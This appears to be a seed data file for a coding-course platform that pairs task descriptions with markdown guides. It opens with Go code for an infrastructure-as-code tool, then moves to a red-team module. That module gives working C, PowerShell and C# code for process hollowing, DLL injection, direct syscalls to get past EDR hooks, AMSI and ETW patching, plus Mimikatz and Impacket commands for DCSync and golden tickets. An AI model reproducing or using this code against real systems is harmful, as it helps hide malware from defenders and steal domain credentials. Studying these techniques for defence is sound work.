    sess := session.Must(session.NewSession(&aws.Config{
        Region:      aws.String(p.region),
        Credentials: credentials.NewStaticCredentials(p.accessKey, p.secretKey, ""),
    }))

    p.ec2 = ec2.New(sess)
    p.s3 = s3.New(sess)
    return nil
}

func (p *AWSProvider) Resources() map[string]Resource {
    return map[string]Resource{
        "aws_instance":        &AWSInstance{provider: p},
        "aws_s3_bucket":       &AWSS3Bucket{provider: p},
        "aws_security_group":  &AWSSecurityGroup{provider: p},
    }
}
\`\`\`

### Plugin Architecture
\`\`\`go
// Providers are separate binaries
// Communication via gRPC

type ProviderPlugin struct {
    path   string
    client *grpc.ClientConn
}

func LoadProvider(name string) (*ProviderPlugin, error) {
    path := fmt.Sprintf("terraform-provider-%s", name)

    // Start provider process
    cmd := exec.Command(path)
    // Set up gRPC connection
    // ...

    return &ProviderPlugin{path: path, client: conn}, nil
}

func (p *ProviderPlugin) Configure(config map[string]interface{}) error {
    return p.client.Call("Configure", config)
}
\`\`\`

## Completion Criteria
- [ ] Define provider interface
- [ ] Implement CRUD operations
- [ ] Configure with credentials
- [ ] Plugin loading mechanism`],

				['Implement resource schema', 'Define resource attributes: name, type (string, int, list, map), required/optional, computed, sensitive. Validation rules. Document for user reference.',
`## Resource Schema Definition

### Schema Types
\`\`\`go
type SchemaType int

const (
    TypeString SchemaType = iota
    TypeInt
    TypeFloat
    TypeBool
    TypeList
    TypeSet
    TypeMap
)

type Schema struct {
    Type        SchemaType
    Description string
    Required    bool
    Optional    bool
    Computed    bool      // Set by provider, not user
    Sensitive   bool      // Don't show in logs/output
    Default     interface{}
    Elem        *Schema   // For list/set/map
    ValidateFunc func(interface{}) error
}

type ResourceSchema struct {
    Attributes map[string]*Schema
}
\`\`\`

### Example Resource Schema
\`\`\`go
func (r *AWSInstance) Schema() *ResourceSchema {
    return &ResourceSchema{
        Attributes: map[string]*Schema{
            "id": {
                Type:     TypeString,
                Computed: true,
                Description: "The instance ID",
            },
            "ami": {
                Type:        TypeString,
                Required:    true,
                Description: "AMI to use for the instance",
            },
            "instance_type": {
                Type:        TypeString,
                Required:    true,
                Description: "Type of instance to start",
                ValidateFunc: validateInstanceType,
            },
            "tags": {
                Type:     TypeMap,
                Optional: true,
                Elem:     &Schema{Type: TypeString},
                Description: "Tags to assign to the instance",
            },
            "subnet_id": {
                Type:        TypeString,
                Optional:    true,
                Description: "VPC Subnet ID to launch in",
            },
            "private_ip": {
                Type:     TypeString,
                Computed: true,
                Description: "Private IP address assigned",
            },
            "public_ip": {
                Type:     TypeString,
                Computed: true,
                Description: "Public IP address assigned",
            },
        },
    }
}
\`\`\`

### Validation Functions
\`\`\`go
func validateInstanceType(v interface{}) error {
    s := v.(string)
    valid := []string{"t2.micro", "t2.small", "t2.medium", "t3.micro", "t3.small"}
    for _, t := range valid {
        if s == t {
            return nil
        }
    }
    return fmt.Errorf("invalid instance_type: %s", s)
}

func validateCIDR(v interface{}) error {
    _, _, err := net.ParseCIDR(v.(string))
    return err
}
\`\`\`

### Schema Documentation
\`\`\`go
func (s *ResourceSchema) GenerateDocs() string {
    var buf strings.Builder

    buf.WriteString("## Arguments\\n\\n")
    for name, attr := range s.Attributes {
        if attr.Required || attr.Optional {
            buf.WriteString(fmt.Sprintf("* \`%s\` - ", name))
            if attr.Required {
                buf.WriteString("(Required) ")
            } else {
                buf.WriteString("(Optional) ")
            }
            buf.WriteString(attr.Description + "\\n")
        }
    }

    buf.WriteString("\\n## Attributes Reference\\n\\n")
    for name, attr := range s.Attributes {
        if attr.Computed {
            buf.WriteString(fmt.Sprintf("* \`%s\` - %s\\n", name, attr.Description))
        }
    }

    return buf.String()
}
\`\`\`

## Completion Criteria
- [ ] Define schema types
- [ ] Required/optional/computed flags
- [ ] Validation functions
- [ ] Generate documentation`],

				['Add data sources', 'Read-only resources that fetch existing infrastructure data. Example: aws_ami data source to find latest AMI ID. Use in other resources.',
`## Data Sources

### Data Source Interface
\`\`\`go
type DataSource interface {
    Schema() *ResourceSchema
    Read(ctx context.Context, config ResourceData) (*ResourceData, error)
}

// Data sources are read-only
// Used to query existing infrastructure
\`\`\`

### Example: AWS AMI Data Source
\`\`\`go
type AWSAMIDataSource struct {
    provider *AWSProvider
}

func (d *AWSAMIDataSource) Schema() *ResourceSchema {
    return &ResourceSchema{
        Attributes: map[string]*Schema{
            "id": {Type: TypeString, Computed: true},
            "most_recent": {Type: TypeBool, Optional: true, Default: false},
            "owners": {Type: TypeList, Required: true, Elem: &Schema{Type: TypeString}},
            "filter": {
                Type: TypeSet,
                Optional: true,
                Elem: &Schema{
                    Type: TypeMap,
                    Elem: &Schema{Type: TypeString},
                },
            },
            "name": {Type: TypeString, Computed: true},
            "architecture": {Type: TypeString, Computed: true},
        },
    }
}

func (d *AWSAMIDataSource) Read(ctx context.Context, config ResourceData) (*ResourceData, error) {
    input := &ec2.DescribeImagesInput{
        Owners: aws.StringSlice(config.Attributes["owners"].([]string)),
    }

    // Add filters
    if filters, ok := config.Attributes["filter"]; ok {
        for _, f := range filters.([]interface{}) {
            filter := f.(map[string]interface{})
            input.Filters = append(input.Filters, &ec2.Filter{
                Name:   aws.String(filter["name"].(string)),
                Values: aws.StringSlice(filter["values"].([]string)),
            })
        }
    }

    result, err := d.provider.ec2.DescribeImages(input)
    if err != nil {
        return nil, err
    }

    // Sort by creation date if most_recent
    if config.Attributes["most_recent"].(bool) {
        sort.Slice(result.Images, func(i, j int) bool {
            return *result.Images[i].CreationDate > *result.Images[j].CreationDate
        })
    }

    image := result.Images[0]
    return &ResourceData{
        ID: *image.ImageId,
        Attributes: map[string]interface{}{
            "id":           *image.ImageId,
            "name":         *image.Name,
            "architecture": *image.Architecture,
        },
    }, nil
}
\`\`\`

### Usage in Configuration
\`\`\`hcl
data "aws_ami" "ubuntu" {
  most_recent = true
  owners      = ["099720109477"]  # Canonical

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }
}

resource "aws_instance" "web" {
  ami           = data.aws_ami.ubuntu.id  # Reference data source
  instance_type = "t2.micro"
}
\`\`\`

## Completion Criteria
- [ ] Define data source interface
- [ ] Implement read-only query
- [ ] Reference in resources
- [ ] Filter and sort results`],

				['Build provisioners', 'Run scripts after resource creation: local-exec (on Terraform host), remote-exec (SSH to resource). File provisioner for copying files. Use sparingly.',
`## Provisioners

### Provisioner Interface
\`\`\`go
type Provisioner interface {
    Schema() *ProvisionerSchema
    Run(ctx context.Context, resource *ResourceData, conn Connection) error
}

type Connection interface {
    Connect() error
    Execute(command string) (string, error)
    Upload(local, remote string) error
    Close() error
}
\`\`\`

### Local-Exec Provisioner
\`\`\`go
type LocalExecProvisioner struct{}

func (p *LocalExecProvisioner) Run(ctx context.Context, resource *ResourceData, _ Connection) error {
    command := resource.Attributes["command"].(string)

    // Substitute resource attributes
    command = interpolate(command, resource)

    // Run locally
    cmd := exec.CommandContext(ctx, "sh", "-c", command)
    cmd.Env = os.Environ()

    // Set working directory
    if dir, ok := resource.Attributes["working_dir"]; ok {
        cmd.Dir = dir.(string)
    }

    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Errorf("local-exec failed: %s\\nOutput: %s", err, output)
    }

    return nil
}
\`\`\`

### Remote-Exec Provisioner
\`\`\`go
type RemoteExecProvisioner struct{}

func (p *RemoteExecProvisioner) Run(ctx context.Context, resource *ResourceData, conn Connection) error {
    if err := conn.Connect(); err != nil {
        return fmt.Errorf("failed to connect: %v", err)
    }
    defer conn.Close()

    // Run inline commands
    if inline, ok := resource.Attributes["inline"]; ok {
        for _, cmd := range inline.([]interface{}) {
            output, err := conn.Execute(cmd.(string))
            if err != nil {
                return fmt.Errorf("command failed: %s\\nOutput: %s", err, output)
            }
        }
    }

    // Or run a script
    if script, ok := resource.Attributes["script"]; ok {
        scriptContent, _ := ioutil.ReadFile(script.(string))
        conn.Upload(script.(string), "/tmp/script.sh")
        conn.Execute("chmod +x /tmp/script.sh && /tmp/script.sh")
    }

    return nil
}
\`\`\`

### SSH Connection
\`\`\`go
type SSHConnection struct {
    host       string
    user       string
    privateKey []byte
    client     *ssh.Client
}

func (c *SSHConnection) Connect() error {
    signer, _ := ssh.ParsePrivateKey(c.privateKey)
    config := &ssh.ClientConfig{
        User:            c.user,
        Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:         30 * time.Second,
    }

    client, err := ssh.Dial("tcp", c.host+":22", config)
    c.client = client
    return err
}

func (c *SSHConnection) Execute(command string) (string, error) {
    session, _ := c.client.NewSession()
    defer session.Close()
    output, err := session.CombinedOutput(command)
    return string(output), err
}
\`\`\`

## Completion Criteria
- [ ] Local-exec runs on host
- [ ] Remote-exec over SSH
- [ ] File upload provisioner
- [ ] Connection retry logic`],

				['Implement backends', 'Store state remotely: S3 + DynamoDB (locking), Terraform Cloud, Consul, PostgreSQL. State locking prevents concurrent modifications. Encryption at rest.',
`## State Backends

### Backend Interface
\`\`\`go
type Backend interface {
    GetState() (*State, error)
    PutState(state *State) error
    Lock() (string, error)   // Returns lock ID
    Unlock(lockID string) error
    Delete() error
}

type State struct {
    Version   int
    Serial    int64
    Lineage   string
    Resources map[string]*ResourceState
}
\`\`\`

### S3 Backend
\`\`\`go
type S3Backend struct {
    bucket       string
    key          string
    region       string
    dynamoTable  string  // For locking
    s3Client     *s3.S3
    dynamoClient *dynamodb.DynamoDB
}

func (b *S3Backend) GetState() (*State, error) {
    result, err := b.s3Client.GetObject(&s3.GetObjectInput{
        Bucket: aws.String(b.bucket),
        Key:    aws.String(b.key),
    })
    if err != nil {
        if aerr, ok := err.(awserr.Error); ok && aerr.Code() == "NoSuchKey" {
            return &State{}, nil  // Empty state
        }
        return nil, err
    }

    var state State
    json.NewDecoder(result.Body).Decode(&state)
    return &state, nil
}

func (b *S3Backend) PutState(state *State) error {
    state.Serial++
    data, _ := json.Marshal(state)

    _, err := b.s3Client.PutObject(&s3.PutObjectInput{
        Bucket:               aws.String(b.bucket),
        Key:                  aws.String(b.key),
        Body:                 bytes.NewReader(data),
        ServerSideEncryption: aws.String("AES256"),
    })
    return err
}
\`\`\`

### State Locking
\`\`\`go
func (b *S3Backend) Lock() (string, error) {
    lockID := uuid.New().String()

    _, err := b.dynamoClient.PutItem(&dynamodb.PutItemInput{
        TableName: aws.String(b.dynamoTable),
        Item: map[string]*dynamodb.AttributeValue{
            "LockID": {S: aws.String(b.key)},
            "Info": {S: aws.String(fmt.Sprintf(
                "Operation: %s, Who: %s, When: %s",
                "plan/apply",
                os.Getenv("USER"),
                time.Now().Format(time.RFC3339),
            ))},
        },
        ConditionExpression: aws.String("attribute_not_exists(LockID)"),
    })

    if err != nil {
        return "", fmt.Errorf("state is locked: %v", err)
    }

    return lockID, nil
}

func (b *S3Backend) Unlock(lockID string) error {
    _, err := b.dynamoClient.DeleteItem(&dynamodb.DeleteItemInput{
        TableName: aws.String(b.dynamoTable),
        Key: map[string]*dynamodb.AttributeValue{
            "LockID": {S: aws.String(b.key)},
        },
    })
    return err
}
\`\`\`

### Backend Configuration
\`\`\`hcl
terraform {
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    dynamodb_table = "terraform-locks"
    encrypt        = true
  }
}
\`\`\`

## Completion Criteria
- [ ] Get/put state to backend
- [ ] State locking mechanism
- [ ] Encryption at rest
- [ ] Support multiple backends`],
			]);
		} else if (p.name.includes('Red Team') || p.name.includes('Malware') || p.name.includes('AD')) {
			let modId = getOrCreateModule(p.id, 'Offensive Techniques', 'Attack methods', 20);
			addTasksToModule(modId, [
				['Implement process hollowing', 'Create suspended process, unmap original code (NtUnmapViewOfSection), write payload, set thread context to new entry point, resume. Process runs payload but looks legitimate.',
`## Process Hollowing

### Technique Overview
\`\`\`
1. Create legitimate process in suspended state
2. Unmap original executable from memory
3. Allocate and write payload
4. Update entry point in thread context
5. Resume thread - payload executes

Result: Malicious code runs under legitimate process name
\`\`\`

### Implementation
\`\`\`c
BOOL ProcessHollow(LPWSTR targetPath, LPVOID payload, SIZE_T payloadSize) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // 1. Create suspended process
    if (!CreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    // 2. Get process information
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
        &pbi, sizeof(pbi), NULL);

    // Read PEB to get image base
    PVOID imageBase;
    ReadProcessMemory(pi.hProcess,
        (PVOID)((ULONG_PTR)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress)),
        &imageBase, sizeof(imageBase), NULL);

    // 3. Unmap original executable
    NtUnmapViewOfSection(pi.hProcess, imageBase);

    // 4. Allocate memory for payload
    PVOID remoteMem = VirtualAllocEx(pi.hProcess, imageBase, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 5. Write payload
    WriteProcessMemory(pi.hProcess, remoteMem, payload, payloadSize, NULL);

    // 6. Update thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Parse PE to find entry point
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)payload + dosHeader->e_lfanew);
    ctx.Rcx = (DWORD64)((BYTE*)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    SetThreadContext(pi.hThread, &ctx);

    // 7. Resume execution
    ResumeThread(pi.hThread);

    return TRUE;
}
\`\`\`

### Detection Evasion
\`\`\`
Choose good target processes:
- svchost.exe (common, many instances)
- RuntimeBroker.exe (Windows 10+)
- dllhost.exe (COM surrogate)

Avoid:
- Processes with unusual command lines
- 32-bit processes on 64-bit OS (architecture mismatch)
\`\`\`

## Completion Criteria
- [ ] Create suspended process
- [ ] Unmap and replace code
- [ ] Update entry point
- [ ] Verify execution`],

				['Build DLL injection', 'Classic: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread with LoadLibrary. Manual mapping: copy PE, resolve imports, call DllMain. Reflective: DLL loads itself from memory.',
`## DLL Injection Techniques

### Classic Injection
\`\`\`c
BOOL InjectDLL(DWORD pid, LPCSTR dllPath) {
    // 1. Get handle to target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // 2. Allocate memory for DLL path
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen,
        MEM_COMMIT, PAGE_READWRITE);

    // 3. Write DLL path to target
    WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);

    // 4. Get LoadLibraryA address (same in all processes)
    LPVOID loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    // 5. Create remote thread calling LoadLibrary
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr, remotePath, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}
\`\`\`

### Manual Mapping
\`\`\`c
// Load DLL manually without using LoadLibrary (harder to detect)
BOOL ManualMap(HANDLE hProcess, LPVOID dllBuffer) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllBuffer + dosHeader->e_lfanew);

    // 1. Allocate memory at preferred base (or relocate)
    LPVOID remoteBase = VirtualAllocEx(hProcess,
        (LPVOID)ntHeaders->OptionalHeader.ImageBase,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 2. Copy headers
    WriteProcessMemory(hProcess, remoteBase, dllBuffer,
        ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // 3. Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        WriteProcessMemory(hProcess,
            (BYTE*)remoteBase + section->VirtualAddress,
            (BYTE*)dllBuffer + section->PointerToRawData,
            section->SizeOfRawData, NULL);
    }

    // 4. Process relocations (if base address changed)
    // 5. Resolve imports
    // 6. Call DllMain via remote thread

    return TRUE;
}
\`\`\`

### Reflective Injection
\`\`\`
DLL contains its own loader:
1. Shellcode finds itself in memory
2. Parses own PE headers
3. Resolves imports
4. Processes relocations
5. Calls DllMain

No LoadLibrary call - harder to detect
Tools: Reflective DLL Injection by Stephen Fewer
\`\`\`

## Completion Criteria
- [ ] Implement classic injection
- [ ] Build manual mapper
- [ ] Understand reflective loading
- [ ] Test detection avoidance`],

				['Add syscall evasion', 'Bypass usermode hooks by calling kernel directly. Get syscall numbers from ntdll.dll. Build stubs: mov r10,rcx; mov eax,SSN; syscall; ret. SysWhispers, HellsGate tools.',
`## Direct Syscall Evasion

### Why Direct Syscalls
\`\`\`
Normal API call flow:
Application → kernel32.dll → ntdll.dll → syscall → Kernel

EDR/AV hooks ntdll.dll to monitor:
Application → kernel32.dll → [HOOK] ntdll.dll → syscall

Direct syscall bypasses hooks:
Application → syscall → Kernel
\`\`\`

### Get Syscall Numbers
\`\`\`c
// Read from ntdll.dll on disk (clean copy)
DWORD GetSyscallNumber(LPCSTR functionName) {
    // Map ntdll from disk
    HANDLE hFile = CreateFile("C:\\\\Windows\\\\System32\\\\ntdll.dll", ...);
    HANDLE hMapping = CreateFileMapping(hFile, ...);
    LPVOID ntdll = MapViewOfFile(hMapping, ...);

    // Find export
    PIMAGE_EXPORT_DIRECTORY exports = GetExportDirectory(ntdll);
    DWORD funcRVA = FindExportByName(exports, functionName);
    BYTE* funcAddr = (BYTE*)ntdll + funcRVA;

    // Syscall stub: mov eax, SSN; ...
    // SSN is at offset 4
    return *(DWORD*)(funcAddr + 4);
}
\`\`\`

### Syscall Stub
\`\`\`asm
; x64 syscall stub
NtAllocateVirtualMemory PROC
    mov r10, rcx            ; First param to r10 (Windows convention)
    mov eax, 18h            ; Syscall number for NtAllocateVirtualMemory
    syscall                 ; Transition to kernel
    ret
NtAllocateVirtualMemory ENDP
\`\`\`

### SysWhispers Pattern
\`\`\`c
// Generate syscall stubs at runtime
void InitializeSyscalls() {
    // Find syscall numbers by parsing ntdll
    syscall_NtAllocateVirtualMemory = GetSSN("NtAllocateVirtualMemory");
    syscall_NtWriteVirtualMemory = GetSSN("NtWriteVirtualMemory");
    syscall_NtCreateThreadEx = GetSSN("NtCreateThreadEx");
    // ...
}

// Use direct syscall instead of API
NTSTATUS status = NtAllocateVirtualMemory_Syscall(
    processHandle,
    &baseAddress,
    0,
    &regionSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
\`\`\`

### Hell's Gate
\`\`\`c
// Dynamically resolve syscall numbers from hooked ntdll
// Even if bytes are modified, pattern still recognizable:
// mov r10, rcx (4C 8B D1)
// mov eax, XX XX XX XX (B8 XX XX XX XX) <- SSN here
// If hooked, walk to nearby functions to find pattern
\`\`\`

## Completion Criteria
- [ ] Read syscall numbers from ntdll
- [ ] Build syscall stubs
- [ ] Call kernel directly
- [ ] Avoid detection by hooks`],

				['Implement AMSI bypass', 'Patch AmsiScanBuffer to return clean. Or patch amsi.dll in memory. Or use obfuscation to avoid signatures. PowerShell: [Ref].Assembly... to access AMSI context.',
`## AMSI Bypass Techniques

### What is AMSI
\`\`\`
Antimalware Scan Interface:
- Scans PowerShell, VBScript, JScript before execution
- Also scans .NET assemblies loaded via reflection
- Provides content to registered AV/EDR products

Bypass = Make AMSI think content is clean
\`\`\`

### Patch AmsiScanBuffer
\`\`\`c
// Patch amsi.dll in current process memory
BOOL PatchAmsi() {
    HMODULE amsi = LoadLibrary("amsi.dll");
    FARPROC amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

    // Make memory writable
    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Patch to return AMSI_RESULT_CLEAN
    // xor eax, eax (clean result)
    // ret
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    memcpy(amsiScanBuffer, patch, sizeof(patch));

    VirtualProtect(amsiScanBuffer, 6, oldProtect, &oldProtect);
    return TRUE;
}
\`\`\`

### PowerShell Bypass
\`\`\`powershell
# Access AMSI context and set to uninitialized
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
$b = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
[IntPtr]$ptr = $b.GetValue($null)
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Or patch AmsiScanBuffer via reflection
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$addr = [Win32]::GetProcAddress([Win32]::GetModuleHandle("amsi.dll"), "AmsiScanBuffer")
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
\`\`\`

### Obfuscation Alternative
\`\`\`powershell
# Break up signatures
$a = "Ams"
$b = "iSc"
$c = "anBuf"
$d = "fer"
# Use: $a+$b+$c+$d

# String concatenation
IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("...base64...")))

# Variable substitution
$var = "AmsiScanBuffer"
$var = $var.replace("Scan", "Sc" + "an")
\`\`\`

### .NET Assembly AMSI
\`\`\`csharp
// Patch from C# before loading malicious assembly
public static void BypassAMSI() {
    IntPtr amsi = LoadLibrary("amsi.dll");
    IntPtr addr = GetProcAddress(amsi, "AmsiScanBuffer");

    byte[] patch = { 0x31, 0xC0, 0xC3 };
    VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out _);
    Marshal.Copy(patch, 0, addr, patch.Length);
}
\`\`\`

## Completion Criteria
- [ ] Patch AMSI in memory
- [ ] PowerShell bypass
- [ ] Obfuscation techniques
- [ ] Test against Defender`],

				['Build ETW patching', 'Disable Event Tracing: patch EtwEventWrite to ret. Or remove provider registrations. Prevents security tools from receiving telemetry. Also patch NtTraceEvent.',
`## ETW Patching

### What is ETW
\`\`\`
Event Tracing for Windows:
- Kernel-level logging mechanism
- Used by Defender, EDRs for telemetry
- Logs: process creation, DLL loads, network, registry

ETW Providers:
- Microsoft-Windows-Threat-Intelligence (Defender)
- Microsoft-Windows-DotNETRuntime (.NET events)
- Microsoft-Antimalware-Scan-Interface (AMSI)
\`\`\`

### Patch EtwEventWrite
\`\`\`c
// Prevent events from being written
BOOL PatchETW() {
    HMODULE ntdll = GetModuleHandle("ntdll.dll");
    FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Patch to return immediately (ret = 0xC3)
    *(BYTE*)etwEventWrite = 0xC3;

    VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
    return TRUE;
}
\`\`\`

### PowerShell ETW Bypass
\`\`\`powershell
# Patch EtwEventWrite
$ntdll = [System.Reflection.Assembly]::LoadFile("C:\\Windows\\System32\\ntdll.dll")
$addr = [Win32]::GetProcAddress([Win32]::GetModuleHandle("ntdll.dll"), "EtwEventWrite")
$patch = [Byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 1)

# Or patch NtTraceEvent (kernel version)
$addr = [Win32]::GetProcAddress([Win32]::GetModuleHandle("ntdll.dll"), "NtTraceEvent")
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 1)
\`\`\`

### Disable ETW Provider
\`\`\`c
// Unregister provider instead of patching
// Find provider registration in process memory
// Set provider handle to NULL

// Or modify TRACEHANDLE structure
typedef struct _ETW_REGISTRATION_ENTRY {
    // ...
    TRACEHANDLE TraceHandle;
    // ...
} ETW_REGISTRATION_ENTRY;

// Set TraceHandle to 0 to disable
\`\`\`

### .NET ETW Bypass
\`\`\`csharp
// Disable .NET runtime ETW provider
var etwField = typeof(System.Diagnostics.Tracing.EventSource)
    .GetField("s_currentPid", BindingFlags.NonPublic | BindingFlags.Static);
etwField.SetValue(null, 0);  // Disables event emission

// Or patch ntdll!EtwEventWrite from C#
public static void PatchEtw() {
    IntPtr ntdll = LoadLibrary("ntdll.dll");
    IntPtr addr = GetProcAddress(ntdll, "EtwEventWrite");

    byte[] patch = { 0xC3 };  // ret
    VirtualProtect(addr, (UIntPtr)1, 0x40, out _);
    Marshal.Copy(patch, 0, addr, 1);
}
\`\`\`

### Detection Considerations
\`\`\`
Patching ETW is detectable:
- ETW providers can detect missing events
- Memory integrity checks
- EDR kernel drivers can see patches

Alternatives:
- Unhook only specific providers
- Timing-based evasion
- Direct syscalls (NtTraceEvent)
\`\`\`

## Completion Criteria
- [ ] Patch EtwEventWrite
- [ ] Understand provider registration
- [ ] PowerShell bypass
- [ ] Test telemetry suppression`],
			]);
			modId = getOrCreateModule(p.id, 'Domain Attacks', 'Active Directory', 21);
			addTasksToModule(modId, [
				['Implement DCSync', 'Replicate credentials using DRSUAPI (what DCs use). Requires Replicating Directory Changes rights. lsadump::dcsync extracts all NTLM hashes without touching DC disk.',
`## DCSync Attack

### What is DCSync
\`\`\`
Domain Controllers replicate using DRSUAPI (Directory Replication Service)
If you have replication rights, you can request credentials like a DC

Required rights (any of):
- Domain Admins
- Enterprise Admins
- Administrators
- DC computer accounts
- Explicitly granted "Replicating Directory Changes" + "...All"
\`\`\`

### Using Mimikatz
\`\`\`powershell
# DCSync single user
mimikatz# lsadump::dcsync /domain:corp.com /user:Administrator

# DCSync all users
mimikatz# lsadump::dcsync /domain:corp.com /all

# Output format:
# SAM Username: Administrator
# Hash NTLM: aad3b435b51404eeaad3b435b51404ee:...
# Supplemental Credentials: Kerberos keys, cleartext if stored
\`\`\`

### Impacket secretsdump
\`\`\`bash
# DCSync with credentials
secretsdump.py corp.com/admin:password@dc01.corp.com -just-dc

# DCSync with NTLM hash
secretsdump.py -hashes :ntlm_hash corp.com/admin@dc01.corp.com -just-dc

# Specific user only
secretsdump.py corp.com/admin:password@dc01.corp.com -just-dc-user krbtgt
\`\`\`

### Protocol Details
\`\`\`python
# Connect to DRSUAPI endpoint
from impacket.dcerpc.v5 import drsuapi

rpc = RPCTransport(dc_ip)
dce = rpc.get_dce_rpc()
dce.connect()
dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

# Bind to domain
request = drsuapi.DRSBind()
response = dce.request(request)
drs_handle = response['phDrs']

# Request user replication
request = drsuapi.DRSGetNCChanges()
request['pNC'] = dsname_for_user(username)
response = dce.request(request)

# Parse response for NTLM hash, Kerberos keys
\`\`\`

## Completion Criteria
- [ ] Understand replication rights
- [ ] DCSync with Mimikatz
- [ ] DCSync with Impacket
- [ ] Extract all domain hashes`],

				['Build golden ticket', 'Forge TGT with krbtgt hash: any user, any groups, 10-year validity. kerberos::golden /user:admin /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash. Complete domain compromise.',
`## Golden Ticket Attack

### Requirements
\`\`\`
Need:
- Domain SID (S-1-5-21-...)
- Domain FQDN (corp.com)
- krbtgt NTLM hash (from DCSync)

Result:
- Forge TGT for ANY user
- ANY group memberships
- Valid for 10 years (default)
- Works until krbtgt password changed TWICE
\`\`\`

### Create Golden Ticket
\`\`\`powershell
# Mimikatz - create and inject ticket
mimikatz# kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ptt

# Mimikatz - save to file
mimikatz# kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ticket:golden.kirbi

# Add arbitrary groups (Domain Admins=512, Enterprise Admins=519)
mimikatz# kerberos::golden ... /groups:512,519,513
\`\`\`

### Impacket ticketer
\`\`\`bash
# Create golden ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.com Administrator

# Output: Administrator.ccache

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.com/Administrator@dc01.corp.com
\`\`\`

### Using Golden Ticket
\`\`\`powershell
# After /ptt, ticket is in memory
# Access any resource as the forged user

dir \\\\dc01.corp.com\\c$
Enter-PSSession -ComputerName dc01.corp.com
\`\`\`

### Detection & Mitigation
\`\`\`
Detection:
- TGT lifetime > 10 hours (default max)
- TGT has SID history that doesn't match
- Account name doesn't exist
- Login from unusual source

Mitigation:
- Change krbtgt password TWICE
- Monitor for long-lived TGTs
- Use Protected Users group
\`\`\`

## Completion Criteria
- [ ] Get krbtgt hash via DCSync
- [ ] Create golden ticket
- [ ] Access resources with forged TGT
- [ ] Understand persistence`],

				['Add silver ticket', 'Forge TGS with service account hash. Target specific service (CIFS, HTTP, MSSQL). No DC contact needed. Service account hash from Kerberoast or local extraction.',
`## Silver Ticket Attack

### Silver vs Golden
\`\`\`
Golden Ticket:
- Forges TGT (Ticket Granting Ticket)
- Uses krbtgt hash
- Works for all services
- Requires DC contact for TGS

Silver Ticket:
- Forges TGS (Service Ticket)
- Uses service account hash
- Works only for that service
- NO DC contact needed (stealthier)
\`\`\`

### Common Service SPNs
\`\`\`
Service         SPN                     Use
